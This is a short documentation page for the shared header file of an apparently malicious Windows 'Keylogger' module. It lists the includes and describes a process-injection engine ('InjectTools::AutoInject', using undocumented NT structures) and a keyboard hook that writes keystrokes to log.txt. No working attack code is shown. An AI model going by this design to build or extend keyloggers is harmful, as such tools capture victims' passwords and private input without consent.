# Includes.h

## Overview
`Includes.h` is the shared precompiled header for the **Keylogger** module. Every `.cpp` file includes this file as its single dependency entry point.

---

## Contents

```cpp
#pragma once

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

#include "InjectTools.h"
#include "Keylogger.h"
```

| Include | Purpose |
| :--- | :--- |
| `<Windows.h>` | Core Win32 API — hooks, process/memory/file primitives, message loop. |
| `<winternl.h>` | Undocumented NT structures required by the injection engine (`PROCESS_BASIC_INFORMATION`, `PROCESSINFOCLASS`). |
| `<stdio.h>` | `printf` used in `Keylogger::Init` for error output. |
| `<iostream>` | Available for debug output. |
| `<fstream>` | `std::ofstream` used in `Keylogger::HookProc` to write `log.txt`. |
| `"InjectTools.h"` | Injection engine — exposes `InjectTools::AutoInject`. See [`InjectTools.h.md`](InjectTools.h.md). |
| `"Keylogger.h"` | Hook and message-loop interface — exposes `Keylogger::HookProc` and `Keylogger::Init`. See [`Keylogger.h.md`](Keylogger.h.md). |

---

## Modifying

To add a dependency available across the entire module, include it here rather than in individual `.cpp` files. Keep this file minimal — only genuinely shared headers belong here.